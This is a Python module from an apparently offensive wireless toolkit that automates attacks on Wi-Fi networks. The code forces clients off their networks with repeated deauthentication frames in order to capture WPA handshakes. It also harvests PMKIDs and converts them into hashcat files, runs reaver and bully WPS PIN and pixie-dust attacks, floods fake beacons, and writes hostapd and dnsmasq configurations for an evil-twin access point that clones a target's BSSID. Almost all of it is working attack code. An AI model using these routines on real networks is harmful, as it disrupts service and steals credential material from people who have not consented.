"""Handshake / PMKID capture and injection (deauth, WPS, evil twin helpers)."""

from __future__ import annotations

import os
import re
import time

from omni.core import config, proc
from omni.core.util import slug

__all__ = ["handshake", "pmkid", "deauth", "wps_pin", "wps_lock_check",
           "beacon_flood", "eviltwin_config", "Capture"]


class Capture:
    """A live airodump-ng capture on one BSSID/channel."""

    def __init__(self, mon_iface: str, bssid: str, channel: int | None,
                 outdir: str):
        self.iface = mon_iface
        self.bssid = bssid.lower()
        self.channel = channel
        self.prefix = os.path.join(outdir, slug(f"{bssid}_{time.strftime('%H%M%S')}"))
        self._proc = None  # type: ignore[assignment]

    def start(self) -> None:
        if self.channel:
            from omni.wifi import iface as iface_mod
            iface_mod.channel(self.iface, int(self.channel))
        argv = ["airodump-ng", "-i", self.iface, "--bssid", self.bssid,
                "--output-format", "pcap,csv", "-w", self.prefix]
        if self.channel:
            argv[:0] = ["-c", str(int(self.channel))]
        proc.require("airodump-ng")
        self._proc = proc.spawn(argv)

    def stop(self) -> None:
        if self._proc is not None:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=5)
            except Exception:  # noqa: BLE001
                self._proc.kill()
            self._proc = None

    def pcap(self) -> str:
        return self.prefix + "-01.cap"

    def csv(self) -> str:
        return self.prefix + "-01.csv"

    def has_handshake(self) -> bool:
        path = self.pcap()
        if not os.path.exists(path):
            return False
        if not proc.has("aircrack-ng"):
            return os.path.getsize(path) > 10_000
        return "handshake" in proc.run(["aircrack-ng", path], timeout=60).out.lower()

    def __enter__(self) -> "Capture":
        self.start()
        return self

    def __exit__(self, *exc) -> None:
        self.stop()


# ---------------------------------------------------------------------------
# operations
# ---------------------------------------------------------------------------

def deauth(mon_iface: str, bssid: str, client: str = "FF:FF:FF:FF:FF:FF",
           count: int = 8, reason: int | None = None) -> proc.Result:
    """Send ``count`` deauth frames (broadcast client by default).

    ``reason`` sets the 802.11 reason code (aireplay's ``--reason``); clients
    differ in which code they honour, so callers cycle it.
    """
    proc.require("aireplay-ng")
    argv = ["aireplay-ng", "--deauth", str(int(count)), "-a", bssid,
            "-c", client]
    if reason is not None:
        argv += [f"--reason={int(reason)}"]
    argv.append(mon_iface)
    return proc.run(argv, timeout=120)


def handshake(mon_iface: str, bssid: str, channel: int | None = None,
              seconds: int = 60, outdir: str | None = None) -> dict:
    """Capture a 4-way handshake: capture + repeated deauth until it lands."""
    outdir = outdir or config.output_dir("wifi")
    cap = Capture(mon_iface, bssid, channel, outdir)
    cap.start()
    try:
        deadline = time.time() + max(10, seconds)
        round_no = 0
        while time.time() < deadline:
            if cap.has_handshake():
                return {"pcap": cap.pcap(), "handshake": True,
                        "rounds": round_no}
            deauth(mon_iface, bssid, count=int(config.get_value(
                "wifi.deauth_count", 8) or 8))
            round_no += 1
            if cap.has_handshake():
                return {"pcap": cap.pcap(), "handshake": True,
                        "rounds": round_no}
            time.sleep(5)
        return {"pcap": cap.pcap(), "handshake": cap.has_handshake(),
                "rounds": round_no}
    finally:
        cap.stop()


def pmkid(mon_iface: str, bssid: str | None = None, seconds: int = 60,
          outdir: str | None = None) -> dict:
    """Harvest PMKIDs with hcxdumptool and convert them for hashcat."""
    proc.require("hcxdumptool")
    outdir = outdir or config.output_dir("wifi")
    stamp = time.strftime("%H%M%S")
    pcapng = os.path.join(outdir, slug(f"pmkid_{bssid or 'any'}_{stamp}.pcapng"))
    argv = ["hcxdumptool", "-i", mon_iface, "-o", pcapng,
            "-w", os.path.join(outdir, "pmkid_log.txt")]
    if bssid:
        argv += ["--filterlist_ap", bssid.replace(":", ""),
                 "--filtermode", "2"]
    res = proc.run(argv, timeout=max(30, seconds + 30))
    hashes = os.path.splitext(pcapng)[0] + ".22000"
    converted = None
    if os.path.exists(pcapng) and proc.has("hcxpcapngtool"):
        conv = proc.run(["hcxpcapngtool", "-o", hashes, pcapng], timeout=300)
        if conv.ok and os.path.exists(hashes):
            converted = hashes
    found = 0
    if converted:
        with open(converted, "r", encoding="utf-8", errors="replace") as fh:
            found = sum(1 for ln in fh if ln.startswith("WPA*"))
    return {"pcapng": pcapng, "hashfile": converted, "pmkids": found,
            "ok": res.ok}


# ---------------------------------------------------------------------------
# WPS
# ---------------------------------------------------------------------------

def wps_pin(mon_iface: str, bssid: str, pin: str | None = None,
            tool: str = "reaver") -> proc.Result:
    """Run a WPS PIN attack (pixie-dust when no pin is supplied)."""
    proc.require(tool)
    if tool == "bully":
        argv = ["bully", "-b", bssid, "-c", "auto", "-d", mon_iface]
        if pin:
            argv += ["-p", pin]
        return proc.run(argv, timeout=900)
    if mon_iface:
        argv = ["reaver", "-i", mon_iface, "-b", bssid, "-vv"]
    else:
        argv = ["reaver", "-b", bssid, "-vv"]
    if pin:
        argv += ["-p", pin]
    else:
        argv += ["-K", "1"]          # pixie dust (WPS mode attack)
    return proc.run(argv, timeout=900)


def wps_lock_check(bssid: str) -> dict:
    """Convenience wrapper for ``wash`` to spot WPS-enabled + locked APs."""
    proc.require("wash")
    res = proc.run(["wash", "-a"], timeout=45)
    rows = []
    for line in res.out.splitlines():
        if bssid and bssid.lower() not in line.lower():
            continue
        cells = line.split()
        if len(cells) >= 5 and cells[0].count(":"):
            rows.append({"bssid": cells[0], "channel": cells[1],
                         "rssi": cells[2], "wps_version": cells[3],
                         "locked": cells[4]})
    return {"locked": bool(rows) and rows[0]["locked"] != "No",
            "rows": rows}


def beacon_flood(mon_iface: str, ssids: list[str] | None = None,
                 count: int = 2000) -> proc.Result:
    """``mdk4`` beacon flood (fake APs)."""
    proc.require("mdk4")
    argv = ["mdk4", mon_iface, "b", "-c", str(int(count))]
    if ssids:
        argv += ["-f", "/dev/stdin"]
        return proc.run(argv, input_text="\n".join(ssids), timeout=300)
    return proc.run(argv, timeout=300)


def eviltwin_config(ssid: str, channel: int, bssid: str | None = None,
                    outdir: str | None = None) -> dict:
    """Write a hostapd + dnsmasq config pair for a rogue AP."""
    outdir = outdir or config.output_dir("wifi/eviltwin")
    safe = slug(ssid)
    hostapd = os.path.join(outdir, f"{safe}_hostapd.conf")
    dnsmasq = os.path.join(outdir, f"{safe}_dnsmasq.conf")
    with open(hostapd, "w", encoding="utf-8") as fh:
        fh.write("\n".join([
            "interface=wlan0",
            "driver=nl80211",
            f"ssid={ssid}",
            f"hw_mode={'a' if int(channel) > 14 else 'g'}",
            f"channel={int(channel)}",
            "auth_algs=1",
            "wmm_enabled=1",
        ]) + "\n")
    if bssid:
        with open(hostapd, "a", encoding="utf-8") as fh:
            fh.write(f"# clone of {bssid}\nbssid={bssid}\n")
    with open(dnsmasq, "w", encoding="utf-8") as fh:
        fh.write("\n".join([
            "interface=wlan0",
            "dhcp-range=10.0.0.10,10.0.0.250,12h",
            "dhcp-option=3,10.0.0.1",
            "dhcp-option=6,10.0.0.1",
            "server=8.8.8.8",
            "log-queries",
            f"log-facility={os.path.join(outdir, 'dnsmasq.log')}",
        ]) + "\n")
    return {"hostapd": hostapd, "dnsmasq": dnsmasq,
            "run": f"sudo hostapd {hostapd}"}


def deauth_log(mon_iface: str, seconds: int = 20) -> list[str]:
    """Short ``tcpdump`` sniff of deauth reason codes (802.11 type 0 sub 12)."""
    proc.require("tcpdump")
    res = proc.run(["tcpdump", "-i", mon_iface, "-nn", "-e", "-c", "40",
                    "type", "mgt", "subtype", "deauth"], timeout=seconds + 10)
    return res.lines()


